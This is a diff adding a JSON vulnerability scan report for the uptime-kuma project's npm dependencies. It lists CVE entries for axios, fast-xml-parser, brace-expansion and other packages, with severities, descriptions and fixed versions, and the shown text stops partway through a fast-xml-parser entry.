@@ -1,0 +1,1852 @@
+{
+  "SchemaVersion": 2,
+  "CreatedAt": "2026-04-23T23:00:43.674540844+07:00",
+  "ArtifactName": "uptime-kuma.json",
+  "ArtifactType": "cyclonedx",
+  "Results": [
+    {
+      "Target": "package-lock.json",
+      "Class": "lang-pkgs",
+      "Type": "npm",
+      "Vulnerabilities": [
+        {
+          "VulnerabilityID": "CVE-2026-3449",
+          "PkgID": "@tootallnate/once@1.1.2",
+          "PkgName": "@tootallnate/once",
+          "PkgIdentifier": {
+            "PURL": "pkg:npm/%40tootallnate/once@1.1.2",
+            "UID": "dca7d0992ed0c01b",
+            "BOMRef": "pkg:npm/%40tootallnate/once@1.1.2"
+          },
+          "InstalledVersion": "1.1.2",
+          "FixedVersion": "3.0.1",
+          "Status": "fixed",
+          "SeveritySource": "ghsa",
+          "PrimaryURL": "https://avd.aquasec.com/nvd/cve-2026-3449",
+          "DataSource": {
+            "ID": "ghsa",
+            "Name": "GitHub Security Advisory npm",
+            "URL": "https://github.com/advisories?query=type%3Areviewed+ecosystem%3Anpm"
+          },
+          "Title": "@tootallnate/once: @tootallnate/once: Denial of Service due to incorrect control flow scoping with AbortSignal",
+          "Description": "Versions of the package @tootallnate/once before 3.0.1 are vulnerable to Incorrect Control Flow Scoping in promise resolving when AbortSignal option is used. The Promise remains in a permanently pending state after the signal is aborted, causing any await or .then() usage to hang indefinitely. This can cause a control-flow leak that can lead to stalled requests, blocked workers, or degraded application availability.",
+          "Severity": "LOW",
+          "CweIDs": [
+            "CWE-705"
+          ],
+          "VendorSeverity": {
+            "ghsa": 1,
+            "redhat": 2
+          },
+          "CVSS": {
+            "ghsa": {
+              "V3Vector": "CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:U/C:N/I:N/A:L",
+              "V40Vector": "CVSS:4.0/AV:L/AC:L/AT:N/PR:L/UI:N/VC:N/VI:N/VA:L/SC:N/SI:N/SA:N/E:P",
+              "V3Score": 3.3,
+              "V40Score": 1.9
+            },
+            "redhat": {
+              "V3Vector": "CVSS:3.1/AV:L/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:L",
+              "V3Score": 4
+            }
+          },
+          "References": [
+            "https://access.redhat.com/security/cve/CVE-2026-3449",
+            "https://github.com/TooTallNate/once",
+            "https://github.com/TooTallNate/once/commit/b9f43cc5259bee2952d91ad3cdbd201a82df448a",
+            "https://github.com/TooTallNate/once/issues/8",
+            "https://nvd.nist.gov/vuln/detail/CVE-2026-3449",
+            "https://security.snyk.io/vuln/SNYK-JS-TOOTALLNATEONCE-15250612",
+            "https://www.cve.org/CVERecord?id=CVE-2026-3449"
+          ],
+          "PublishedDate": "2026-03-03T05:17:25.017Z",
+          "LastModifiedDate": "2026-03-03T21:52:29.877Z"
+        },
+        {
+          "VulnerabilityID": "CVE-2025-62718",
+          "PkgID": "axios@0.30.3",
+          "PkgName": "axios",
+          "PkgIdentifier": {
+            "PURL": "pkg:npm/axios@0.30.3",
+            "UID": "ce7cd81eb37c6bd8",
+            "BOMRef": "pkg:npm/axios@0.30.3"
+          },
+          "InstalledVersion": "0.30.3",
+          "FixedVersion": "1.15.0, 0.31.0",
+          "Status": "fixed",
+          "SeveritySource": "ghsa",
+          "PrimaryURL": "https://avd.aquasec.com/nvd/cve-2025-62718",
+          "DataSource": {
+            "ID": "ghsa",
+            "Name": "GitHub Security Advisory npm",
+            "URL": "https://github.com/advisories?query=type%3Areviewed+ecosystem%3Anpm"
+          },
+          "Title": "axios: Axios: Server-Side Request Forgery and proxy bypass due to improper hostname normalization",
+          "Description": "Axios is a promise based HTTP client for the browser and Node.js. Prior to 1.15.0 and 0.31.0, Axios does not correctly handle hostname normalization when checking NO_PROXY rules. Requests to loopback addresses like localhost. (with a trailing dot) or [::1] (IPv6 literal) skip NO_PROXY matching and go through the configured proxy. This goes against what developers expect and lets attackers force requests through a proxy, even if NO_PROXY is set up to protect loopback or internal services. This issue leads to the possibility of proxy bypass and SSRF vulnerabilities allowing attackers to reach sensitive loopback or internal services despite the configured protections. This vulnerability is fixed in 1.15.0 and 0.31.0.",
+          "Severity": "MEDIUM",
+          "CweIDs": [
+            "CWE-441",
+            "CWE-918"
+          ],
+          "VendorSeverity": {
+            "ghsa": 2,
+            "nvd": 4,
+            "redhat": 3
+          },
+          "CVSS": {
+            "ghsa": {
+              "V3Vector": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:L/I:L/A:N",
+              "V40Vector": "CVSS:4.0/AV:N/AC:L/AT:P/PR:N/UI:N/VC:L/VI:L/VA:N/SC:L/SI:L/SA:N",
+              "V3Score": 4.8,
+              "V40Score": 6.3
+            },
+            "nvd": {
+              "V3Vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:L/A:L",
+              "V3Score": 9.9
+            },
+            "redhat": {
+              "V3Vector": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:L/A:L",
+              "V3Score": 7
+            }
+          },
+          "References": [
+            "https://access.redhat.com/security/cve/CVE-2025-62718",
+            "https://datatracker.ietf.org/doc/html/rfc1034#section-3.1",
+            "https://datatracker.ietf.org/doc/html/rfc3986#section-3.2.2",
+            "https://github.com/axios/axios",
+            "https://github.com/axios/axios/commit/03cdfc99e8db32a390e12128208b6778492cee9c",
+            "https://github.com/axios/axios/commit/fb3befb6daac6cad26b2e54094d0f2d9e47f24df",
+            "https://github.com/axios/axios/pull/10661",
+            "https://github.com/axios/axios/pull/10688",
+            "https://github.com/axios/axios/releases/tag/v0.31.0",
+            "https://github.com/axios/axios/releases/tag/v1.15.0",
+            "https://github.com/axios/axios/security/advisories/GHSA-3p68-rc4w-qgx5",
+            "https://nvd.nist.gov/vuln/detail/CVE-2025-62718",
+            "https://www.cve.org/CVERecord?id=CVE-2025-62718"
+          ],
+          "PublishedDate": "2026-04-09T15:16:08.65Z",
+          "LastModifiedDate": "2026-04-16T19:16:33.063Z"
+        },
+        {
+          "VulnerabilityID": "CVE-2026-40175",
+          "PkgID": "axios@0.30.3",
+          "PkgName": "axios",
+          "PkgIdentifier": {
+            "PURL": "pkg:npm/axios@0.30.3",
+            "UID": "ce7cd81eb37c6bd8",
+            "BOMRef": "pkg:npm/axios@0.30.3"
+          },
+          "InstalledVersion": "0.30.3",
+          "FixedVersion": "1.15.0, 0.31.0",
+          "Status": "fixed",
+          "SeveritySource": "ghsa",
+          "PrimaryURL": "https://avd.aquasec.com/nvd/cve-2026-40175",
+          "DataSource": {
+            "ID": "ghsa",
+            "Name": "GitHub Security Advisory npm",
+            "URL": "https://github.com/advisories?query=type%3Areviewed+ecosystem%3Anpm"
+          },
+          "Title": "axios: Axios: Remote Code Execution via Prototype Pollution escalation",
+          "Description": "Axios is a promise based HTTP client for the browser and Node.js. Prior to 1.15.0 and 0.3.1, the Axios library is vulnerable to a specific \"Gadget\" attack chain that allows Prototype Pollution in any third-party dependency to be escalated into Remote Code Execution (RCE) or Full Cloud Compromise (via AWS IMDSv2 bypass). This vulnerability is fixed in 1.15.0 and 0.3.1.",
+          "Severity": "MEDIUM",
+          "CweIDs": [
+            "CWE-113",
+            "CWE-444",
+            "CWE-918"
+          ],
+          "VendorSeverity": {
+            "ghsa": 2,
+            "nvd": 2,
+            "redhat": 3
+          },
+          "CVSS": {
+            "ghsa": {
+              "V3Vector": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:L/I:L/A:N",
+              "V3Score": 4.8
+            },
+            "nvd": {
+              "V3Vector": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:L/I:L/A:N",
+              "V3Score": 4.8
+            },
+            "redhat": {
+              "V3Vector": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:C/C:H/I:H/A:H",
+              "V3Score": 9
+            }
+          },
+          "References": [
+            "https://access.redhat.com/security/cve/CVE-2026-40175",
+            "https://github.com/axios/axios",
+            "https://github.com/axios/axios/commit/03cdfc99e8db32a390e12128208b6778492cee9c",
+            "https://github.com/axios/axios/commit/363185461b90b1b78845dc8a99a1f103d9b122a1",
+            "https://github.com/axios/axios/pull/10660",
+            "https://github.com/axios/axios/pull/10660#issuecomment-4224168081",
+            "https://github.com/axios/axios/pull/10688",
+            "https://github.com/axios/axios/releases/tag/v0.31.0",
+            "https://github.com/axios/axios/releases/tag/v1.15.0",
+            "https://github.com/axios/axios/security/advisories/GHSA-fvcv-3m26-pcqx",
+            "https://nvd.nist.gov/vuln/detail/CVE-2026-40175",
+            "https://www.cve.org/CVERecord?id=CVE-2026-40175"
+          ],
+          "PublishedDate": "2026-04-10T20:16:22.8Z",
+          "LastModifiedDate": "2026-04-21T19:44:44.4Z"
+        },
+        {
+          "VulnerabilityID": "CVE-2026-33750",
+          "PkgID": "brace-expansion@1.1.12",
+          "PkgName": "brace-expansion",
+          "PkgIdentifier": {
+            "PURL": "pkg:npm/brace-expansion@1.1.12",
+            "UID": "7f63fff65c7c33cf",
+            "BOMRef": "pkg:npm/brace-expansion@1.1.12"
+          },
+          "InstalledVersion": "1.1.12",
+          "FixedVersion": "5.0.5, 3.0.2, 2.0.3, 1.1.13",
+          "Status": "fixed",
+          "SeveritySource": "ghsa",
+          "PrimaryURL": "https://avd.aquasec.com/nvd/cve-2026-33750",
+          "DataSource": {
+            "ID": "ghsa",
+            "Name": "GitHub Security Advisory npm",
+            "URL": "https://github.com/advisories?query=type%3Areviewed+ecosystem%3Anpm"
+          },
+          "Title": "brace-expansion: brace-expansion: Denial of Service via zero step value in brace pattern",
+          "Description": "The brace-expansion library generates arbitrary strings containing a common prefix and suffix. Prior to versions 5.0.5, 3.0.2, 2.0.3, and 1.1.13, a brace pattern with a zero step value (e.g., `{1..2..0}`) causes the sequence generation loop to run indefinitely, making the process hang for seconds and allocate heaps of memory. Versions 5.0.5, 3.0.2, 2.0.3, and 1.1.13 fix the issue. As a workaround, sanitize strings passed to `expand()` to ensure a step value of `0` is not used.",
+          "Severity": "MEDIUM",
+          "CweIDs": [
+            "CWE-400"
+          ],
+          "VendorSeverity": {
+            "ghsa": 2,
+            "nvd": 3,
+            "redhat": 2
+          },
+          "CVSS": {
+            "ghsa": {
+              "V3Vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:N/I:N/A:H",
+              "V3Score": 6.5
+            },
+            "nvd": {
+              "V3Vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H",
+              "V3Score": 7.5
+            },
+            "redhat": {
+              "V3Vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:N/I:N/A:H",
+              "V3Score": 6.5
+            }
+          },
+          "References": [
+            "https://access.redhat.com/security/cve/CVE-2026-33750",
+            "https://github.com/juliangruber/brace-expansion",
+            "https://github.com/juliangruber/brace-expansion/blob/daa71bcb4a30a2df9bcb7f7b8daaf2ab30e5794a/src/index.ts#L107-L113",
+            "https://github.com/juliangruber/brace-expansion/blob/daa71bcb4a30a2df9bcb7f7b8daaf2ab30e5794a/src/index.ts#L184",
+            "https://github.com/juliangruber/brace-expansion/commit/311ac0d54994158c0a384e286a7d6cbb17ee8ed5",
+            "https://github.com/juliangruber/brace-expansion/commit/7fd684f89fdde3549563d0a6522226a9189472a2",
+            "https://github.com/juliangruber/brace-expansion/commit/b9cacd9e55e7a1fa588fe4b7bb1159d52f1d902a",
+            "https://github.com/juliangruber/brace-expansion/issues/98",
+            "https://github.com/juliangruber/brace-expansion/pull/95",
+            "https://github.com/juliangruber/brace-expansion/pull/96",
+            "https://github.com/juliangruber/brace-expansion/pull/97",
+            "https://github.com/juliangruber/brace-expansion/security/advisories/GHSA-f886-m6hf-6m8v",
+            "https://nvd.nist.gov/vuln/detail/CVE-2026-33750",
+            "https://www.cve.org/CVERecord?id=CVE-2026-33750"
+          ],
+          "PublishedDate": "2026-03-27T15:16:57.297Z",
+          "LastModifiedDate": "2026-04-22T14:23:19.11Z"
+        },
+        {
+          "VulnerabilityID": "CVE-2026-33750",
+          "PkgID": "brace-expansion@2.0.2",
+          "PkgName": "brace-expansion",
+          "PkgIdentifier": {
+            "PURL": "pkg:npm/brace-expansion@2.0.2",
+            "UID": "62ca347bbd714f24",
+            "BOMRef": "pkg:npm/brace-expansion@2.0.2"
+          },
+          "InstalledVersion": "2.0.2",
+          "FixedVersion": "5.0.5, 3.0.2, 2.0.3, 1.1.13",
+          "Status": "fixed",
+          "SeveritySource": "ghsa",
+          "PrimaryURL": "https://avd.aquasec.com/nvd/cve-2026-33750",
+          "DataSource": {
+            "ID": "ghsa",
+            "Name": "GitHub Security Advisory npm",
+            "URL": "https://github.com/advisories?query=type%3Areviewed+ecosystem%3Anpm"
+          },
+          "Title": "brace-expansion: brace-expansion: Denial of Service via zero step value in brace pattern",
+          "Description": "The brace-expansion library generates arbitrary strings containing a common prefix and suffix. Prior to versions 5.0.5, 3.0.2, 2.0.3, and 1.1.13, a brace pattern with a zero step value (e.g., `{1..2..0}`) causes the sequence generation loop to run indefinitely, making the process hang for seconds and allocate heaps of memory. Versions 5.0.5, 3.0.2, 2.0.3, and 1.1.13 fix the issue. As a workaround, sanitize strings passed to `expand()` to ensure a step value of `0` is not used.",
+          "Severity": "MEDIUM",
+          "CweIDs": [
+            "CWE-400"
+          ],
+          "VendorSeverity": {
+            "ghsa": 2,
+            "nvd": 3,
+            "redhat": 2
+          },
+          "CVSS": {
+            "ghsa": {
+              "V3Vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:N/I:N/A:H",
+              "V3Score": 6.5
+            },
+            "nvd": {
+              "V3Vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H",
+              "V3Score": 7.5
+            },
+            "redhat": {
+              "V3Vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:N/I:N/A:H",
+              "V3Score": 6.5
+            }
+          },
+          "References": [
+            "https://access.redhat.com/security/cve/CVE-2026-33750",
+            "https://github.com/juliangruber/brace-expansion",
+            "https://github.com/juliangruber/brace-expansion/blob/daa71bcb4a30a2df9bcb7f7b8daaf2ab30e5794a/src/index.ts#L107-L113",
+            "https://github.com/juliangruber/brace-expansion/blob/daa71bcb4a30a2df9bcb7f7b8daaf2ab30e5794a/src/index.ts#L184",
+            "https://github.com/juliangruber/brace-expansion/commit/311ac0d54994158c0a384e286a7d6cbb17ee8ed5",
+            "https://github.com/juliangruber/brace-expansion/commit/7fd684f89fdde3549563d0a6522226a9189472a2",
+            "https://github.com/juliangruber/brace-expansion/commit/b9cacd9e55e7a1fa588fe4b7bb1159d52f1d902a",
+            "https://github.com/juliangruber/brace-expansion/issues/98",
+            "https://github.com/juliangruber/brace-expansion/pull/95",
+            "https://github.com/juliangruber/brace-expansion/pull/96",
+            "https://github.com/juliangruber/brace-expansion/pull/97",
+            "https://github.com/juliangruber/brace-expansion/security/advisories/GHSA-f886-m6hf-6m8v",
+            "https://nvd.nist.gov/vuln/detail/CVE-2026-33750",
+            "https://www.cve.org/CVERecord?id=CVE-2026-33750"
+          ],
+          "PublishedDate": "2026-03-27T15:16:57.297Z",
+          "LastModifiedDate": "2026-04-22T14:23:19.11Z"
+        },
+        {
+          "VulnerabilityID": "CVE-2026-25896",
+          "PkgID": "fast-xml-parser@5.2.5",
+          "PkgName": "fast-xml-parser",
+          "PkgIdentifier": {
+            "PURL": "pkg:npm/fast-xml-parser@5.2.5",
+            "UID": "36a01081aade4ccb",
+            "BOMRef": "pkg:npm/fast-xml-parser@5.2.5"
+          },
+          "InstalledVersion": "5.2.5",
+          "FixedVersion": "5.3.5, 4.5.4",
+          "Status": "fixed",
+          "SeveritySource": "ghsa",
+          "PrimaryURL": "https://avd.aquasec.com/nvd/cve-2026-25896",
+          "DataSource": {
+            "ID": "ghsa",
+            "Name": "GitHub Security Advisory npm",
+            "URL": "https://github.com/advisories?query=type%3Areviewed+ecosystem%3Anpm"
+          },
+          "Title": "fast-xml-parser: fast-xml-parser: Cross-Site Scripting (XSS) due to improper DOCTYPE entity handling",
+          "Description": "fast-xml-parser allows users to validate XML, parse XML to JS object, or build XML from JS object without C/C++ based libraries and no callback. From 4.1.3to before 5.3.5, a dot (.) in a DOCTYPE entity name is treated as a regex wildcard during entity replacement, allowing an attacker to shadow built-in XML entities (\u0026lt;, \u0026gt;, \u0026amp;, \u0026quot;, \u0026apos;) with arbitrary values. This bypasses entity encoding and leads to XSS when parsed output is rendered. This vulnerability is fixed in 5.3.5.",
+          "Severity": "CRITICAL",
+          "CweIDs": [
+            "CWE-185"
+          ],
+          "VendorSeverity": {
+            "ghsa": 4,
+            "redhat": 3
+          },
+          "CVSS": {
+            "ghsa": {
+              "V3Vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:L/I:H/A:N",
+              "V3Score": 9.3
+            },
+            "redhat": {
+              "V3Vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:L",
+              "V3Score": 7.1
+            }
+          },
+          "References": [
+            "https://access.redhat.com/security/cve/CVE-2026-25896",
+            "https://github.com/NaturalIntelligence/fast-xml-parser",
+            "https://github.com/NaturalIntelligence/fast-xml-parser/commit/943ef0eb1b2d3284e72dd74f44a042ee9f07026e",
+            "https://github.com/NaturalIntelligence/fast-xml-parser/commit/ddcd0acf26ddd682cb0dc15a2bd6aa3b96bb1e69",
+            "https://github.com/NaturalIntelligence/fast-xml-parser/releases/tag/v5.3.5",
+            "https://github.com/NaturalIntelligence/fast-xml-parser/security/advisories/GHSA-m7jm-9gc2-mpf2",
+            "https://nvd.nist.gov/vuln/detail/CVE-2026-25896",
+            "https://www.cve.org/CVERecord?id=CVE-2026-25896"
+          ],
+          "PublishedDate": "2026-02-20T21:19:27.47Z",
+          "LastModifiedDate": "2026-03-02T14:54:02.76Z"
+        },
+        {
+          "VulnerabilityID": "CVE-2026-25128",
+          "PkgID": "fast-xml-parser@5.2.5",
+          "PkgName": "fast-xml-parser",
+          "PkgIdentifier": {
+            "PURL": "pkg:npm/fast-xml-parser@5.2.5",
+            "UID": "36a01081aade4ccb",
+            "BOMRef": "pkg:npm/fast-xml-parser@5.2.5"
+          },
+          "InstalledVersion": "5.2.5",
+          "FixedVersion": "5.3.4",
+          "Status": "fixed",
+          "SeveritySource": "ghsa",
+          "PrimaryURL": "https://avd.aquasec.com/nvd/cve-2026-25128",
+          "DataSource": {
+            "ID": "ghsa",
+            "Name": "GitHub Security Advisory npm",
+            "URL": "https://github.com/advisories?query=type%3Areviewed+ecosystem%3Anpm"
+          },
+          "Title": "fast-xml-parser: fast-xml-parser has RangeError DoS Numeric Entities Bug",
+          "Description": "fast-xml-parser allows users to validate XML, parse XML to JS object, or build XML from JS object without C/C++ based libraries and no callback. In versions 5.0.9 through 5.3.3, a RangeError vulnerability exists in the numeric entity processing of fast-xml-parser when parsing XML with out-of-range entity code points (e.g., `\u0026#9999999;` or `\u0026#xFFFFFF;`). This causes the parser to throw an uncaught exception, crashing any application that processes untrusted XML input. Version 5.3.4 fixes the issue.",
+          "Severity": "HIGH",
+          "CweIDs": [
+            "CWE-20",
+            "CWE-248"
+          ],
+          "VendorSeverity": {
+            "ghsa": 3,
+            "redhat": 2
+          },
+          "CVSS": {
+            "ghsa": {
+              "V3Vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H",
+              "V3Score": 7.5
+            },
+            "redhat": {
+              "V3Vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:L",
+              "V3Score": 5.3
+            }
+          },
+          "References": [
+            "https://access.redhat.com/security/cve/CVE-2026-25128",
+            "https://github.com/NaturalIntelligence/fast-xml-parser",
+            "https://github.com/NaturalIntelligence/fast-xml-parser/commit/4e387f61c4a5cef792f6a2f42467013290bf95dc",
+            "https://github.com/NaturalIntelligence/fast-xml-parser/releases/tag/v5.3.4",
+            "https://github.com/NaturalIntelligence/fast-xml-parser/security/advisories/GHSA-37qj-frw5-hhjh",
+            "https://nvd.nist.gov/vuln/detail/CVE-2026-25128",
+            "https://www.cve.org/CVERecord?id=CVE-2026-25128"
+          ],
+          "PublishedDate": "2026-01-30T16:16:14.123Z",
+          "LastModifiedDate": "2026-02-27T20:22:44.7Z"
+        },
+        {
+          "VulnerabilityID": "CVE-2026-26278",
+          "PkgID": "fast-xml-parser@5.2.5",
+          "PkgName": "fast-xml-parser",
+          "PkgIdentifier": {
+            "PURL": "pkg:npm/fast-xml-parser@5.2.5",
+            "UID": "36a01081aade4ccb",
+            "BOMRef": "pkg:npm/fast-xml-parser@5.2.5"
+          },
+          "InstalledVersion": "5.2.5",
+          "FixedVersion": "4.5.4, 5.3.6",
+          "Status": "fixed",
+          "SeveritySource": "ghsa",
+          "PrimaryURL": "https://avd.aquasec.com/nvd/cve-2026-26278",
+          "DataSource": {
+            "ID": "ghsa",
+            "Name": "GitHub Security Advisory npm",
+            "URL": "https://github.com/advisories?query=type%3Areviewed+ecosystem%3Anpm"
+          },
+          "Title": "fast-xml-parser: fast-xml-parser: Denial of Service via unlimited XML entity expansion",
+          "Description": "fast-xml-parser allows users to validate XML, parse XML to JS object, or build XML from JS object without C/C++ based libraries and no callback. In versions 4.1.3 through 5.3.5, the XML parser can be forced to do an unlimited amount of entity expansion. With a very small XML input, it’s possible to make the parser spend seconds or even minutes processing a single request, effectively freezing the application. Version 5.3.6 fixes the issue. As a workaround, avoid using DOCTYPE parsing by `processEntities: false` option.",
+          "Severity": "HIGH",
+          "CweIDs": [
+            "CWE-776"
+          ],
+          "VendorSeverity": {
+            "ghsa": 3,
+            "redhat": 3
+          },
+          "CVSS": {
+            "ghsa": {
+              "V3Vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H",
+              "V3Score": 7.5
+            },
+            "redhat": {
+              "V3Vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H",
+              "V3Score": 7.5
+            }
+          },
+          "References": [
+            "https://access.redhat.com/security/cve/CVE-2026-26278",
+            "https://github.com/NaturalIntelligence/fast-xml-parser",
+            "https://github.com/NaturalIntelligence/fast-xml-parser/commit/910dae5be2de2955e968558fadf6e8f74f117a77",
+            "https://github.com/NaturalIntelligence/fast-xml-parser/releases/tag/v5.3.6",
+            "https://github.com/NaturalIntelligence/fast-xml-parser/security/advisories/GHSA-jmr7-xgp7-cmfj",
+            "https://nvd.nist.gov/vuln/detail/CVE-2026-26278",
+            "https://www.cve.org/CVERecord?id=CVE-2026-26278"
+          ],
+          "PublishedDate": "2026-02-19T20:25:43.717Z",
+          "LastModifiedDate": "2026-02-23T19:30:26.017Z"
+        },
+        {
+          "VulnerabilityID": "CVE-2026-33036",
+          "PkgID": "fast-xml-parser@5.2.5",
+          "PkgName": "fast-xml-parser",
+          "PkgIdentifier": {
+            "PURL": "pkg:npm/fast-xml-parser@5.2.5",
+            "UID": "36a01081aade4ccb",
+            "BOMRef": "pkg:npm/fast-xml-parser@5.2.5"
+          },
+          "InstalledVersion": "5.2.5",
+          "FixedVersion": "5.5.6, 4.5.5",
+          "Status": "fixed",
+          "SeveritySource": "ghsa",
+          "PrimaryURL": "https://avd.aquasec.com/nvd/cve-2026-33036",
+          "DataSource": {
+            "ID": "ghsa",
+            "Name": "GitHub Security Advisory npm",
+            "URL": "https://github.com/advisories?query=type%3Areviewed+ecosystem%3Anpm"
+          },
+          "Title": "fast-xml-parser: fast-xml-parser: Denial of Service via XML entity expansion bypass",
+          "Description": "fast-xml-parser allows users to process XML from JS object without C/C++ based libraries or callbacks. Versions 4.0.0-beta.3 through 5.5.5 contain a bypass vulnerability where numeric character references (\u0026#NNN;, \u0026#xHH;) and standard XML entities completely evade the entity expansion limits (e.g., maxTotalExpansions, maxExpandedLength) added to fix CVE-2026-26278, enabling XML entity expansion Denial of Service. The root cause is that replaceEntitiesValue() in OrderedObjParser.js only enforces expansion counting on DOCTYPE-defined entities while the lastEntities loop handling numeric/standard entities performs no counting at all. An attacker supplying 1M numeric entity references like \u0026#65; can force ~147MB of memory allocation and heavy CPU usage, potentially crashing the process—even when developers have configured strict limits. This issue has been fixed in version 5.5.6.",
+          "Severity": "HIGH",
+          "CweIDs": [
+            "CWE-776"
+          ],
+          "VendorSeverity": {
+            "ghsa": 3,
+            "redhat": 2
+          },
+          "CVSS": {
+            "ghsa": {
+              "V3Vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H",
+              "V3Score": 7.5
+            },
+            "redhat": {
+              "V3Vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H",
+              "V3Score": 7.5
+            }
+          },
+          "References": [
+            "https://access.redhat.com/security/cve/CVE-2026-33036",
+            "https://github.com/NaturalIntelligence/fast-xml-parser",
+            "https://github.com/NaturalIntelligence/fast-xml-parser/commit/bd26122c838e6a55e7d7ac49b4ccc01a49999a01",
+            "https://github.com/NaturalIntelligence/fast-xml-parser/releases/tag/v4.5.5",
+            "https://github.com/NaturalIntelligence/fast-xml-parser/releases/tag/v5.5.6",
+            "https://github.com/NaturalIntelligence/fast-xml-parser/security/advisories/GHSA-8gc5-j5rx-235r",
+            "https://nvd.nist.gov/vuln/detail/CVE-2026-33036",
+            "https://www.cve.org/CVERecord?id=CVE-2026-33036"
+          ],
+          "PublishedDate": "2026-03-20T06:16:11.63Z",
+          "LastModifiedDate": "2026-03-23T16:28:10.93Z"
+        },
+        {
+          "VulnerabilityID": "CVE-2026-33349",
+          "PkgID": "fast-xml-parser@5.2.5",
+          "PkgName": "fast-xml-parser",
+          "PkgIdentifier": {
+            "PURL": "pkg:npm/fast-xml-parser@5.2.5",
+            "UID": "36a01081aade4ccb",
+            "BOMRef": "pkg:npm/fast-xml-parser@5.2.5"
+          },
+          "InstalledVersion": "5.2.5",
+          "FixedVersion": "4.5.5, 5.5.7",
+          "Status": "fixed",
+          "SeveritySource": "ghsa",
+          "PrimaryURL": "https://avd.aquasec.com/nvd/cve-2026-33349",
+          "DataSource": {
+            "ID": "ghsa",
+            "Name": "GitHub Security Advisory npm",
+            "URL": "https://github.com/advisories?query=type%3Areviewed+ecosystem%3Anpm"
+          },
+          "Title": "fast-xml-parser: fast-xml-parser: Denial of Service via unbounded entity expansion due to incorrect configuration limit handling",
+          "Description": "fast-xml-parser allows users to process XML from JS object without C/C++ based libraries or callbacks. From version 4.0.0-beta.3 to before version 5.5.7, the DocTypeReader in fast-xml-parser uses JavaScript truthy checks to evaluate maxEntityCount and maxEntitySize configuration limits. When a developer explicitly sets either limit to 0 — intending to disallow all entities or restrict entity size to zero bytes — the falsy nature of 0 in JavaScript causes the guard conditions to short-circuit, completely bypassing the limits. An attacker who can supply XML input to such an application can trigger unbounded entity expansion, leading to memory exhaustion and denial of service. This issue has been patched in version 5.5.7.",
+          "Severity": "MEDIUM",
+          "CweIDs": [
+            "CWE-1284"
+          ],
+          "VendorSeverity": {
+            "ghsa": 2,
+            "redhat": 2
+          },
+          "CVSS": {
+            "ghsa": {
+              "V3Vector": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:N/A:H",
+              "V3Score": 5.9
+            },
+            "redhat": {
+              "V3Vector": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:N/A:H",
+              "V3Score": 5.9
+            }
+          },
+          "References": [
+            "https://access.redhat.com/security/cve/CVE-2026-33349",
+            "https://github.com/NaturalIntelligence/fast-xml-parser",
+            "https://github.com/NaturalIntelligence/fast-xml-parser/commit/239b64aa1fc5c5455ddebbbb54a187eb68c9fdb7",
+            "https://github.com/NaturalIntelligence/fast-xml-parser/commit/88d0936a23dabe51bfbf42255e2ce912dfee2221",
+            "https://github.com/NaturalIntelligence/fast-xml-parser/security/advisories/GHSA-jp2q-39xq-3w4g",
+            "https://nvd.nist.gov/vuln/detail/CVE-2026-33349",
+            "https://www.cve.org/CVERecord?id=CVE-2026-33349"
+          ],
+          "PublishedDate": "2026-03-24T20:16:29.407Z",
+          "LastModifiedDate": "2026-03-26T13:01:52.857Z"
+        },
+        {
+          "VulnerabilityID": "CVE-2026-41650",
+          "PkgID": "fast-xml-parser@5.2.5",
+          "PkgName": "fast-xml-parser",
+          "PkgIdentifier": {
+            "PURL": "pkg:npm/fast-xml-parser@5.2.5",
+            "UID": "36a01081aade4ccb",
+            "BOMRef": "pkg:npm/fast-xml-parser@5.2.5"
+          },
+          "InstalledVersion": "5.2.5",
+          "FixedVersion": "5.7.0",
+          "Status": "fixed",
+          "SeveritySource": "ghsa",
+          "PrimaryURL": "https://avd.aquasec.com/nvd/cve-2026-41650",
+          "DataSource": {
+            "ID": "ghsa",
+            "Name": "GitHub Security Advisory npm",
+            "URL": "https://github.com/advisories?query=type%3Areviewed+ecosystem%3Anpm"
+          },
+          "Title": "fast-xml-parser XMLBuilder: XML Comment and CDATA Injection via Unescaped Delimiters",
